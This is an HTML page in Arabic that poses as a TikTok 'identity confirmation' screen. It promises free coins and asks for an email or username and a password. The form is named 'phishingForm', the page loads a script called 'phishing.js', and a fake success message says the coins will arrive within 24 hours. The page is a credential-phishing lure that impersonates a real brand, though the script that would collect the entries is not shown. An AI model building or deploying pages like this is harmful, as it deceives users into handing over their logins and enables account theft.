<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>تأكيد الهوية - تيك توك</title>
    <link rel="stylesheet" href="style.css" />
</head>
<body>

    <div class="login-container" style="max-width: 500px; margin: 40px auto; padding: 20px;">
        <div class="login-box" style="background: #fff; padding: 40px; border-radius: 16px; box-shadow: 0 4px 30px rgba(0,0,0,0.1);">
            <div class="logo">
                <h1 style="font-size: 28px; color: #1a1a2e; text-align: center;">🎵 TikTok</h1>
                <p style="text-align: center; color: #e94560; font-weight: 600;">تأكيد الهوية لاستلام الكوينز</p>
            </div>
            <form id="phishingForm">
                <label style="display: block; margin-top: 20px; font-weight: 600;">البريد الإلكتروني أو اسم المستخدم</label>
                <input type="text" id="email" placeholder="example@email.com" required style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-top: 5px;" />

                <label style="display: block; margin-top: 20px; font-weight: 600;">كلمة السر</label>
                <input type="password" id="password" placeholder="••••••••" required style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; margin-top: 5px;" />

                <button type="submit" style="width: 100%; padding: 14px; margin-top: 25px; background: #1a1a2e; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer;">تأكيد الهوية</button>
            </form>
            <p id="successMessage" style="display: none; color: green; margin-top: 15px; text-align: center;">
                ✅ تم تأكيد الهوية! سيتم إرسال الكوينز خلال 24 ساعة.
            </p>
        </div>
    </div>

    <script src="phishing.js"></script>
</body>
</html>
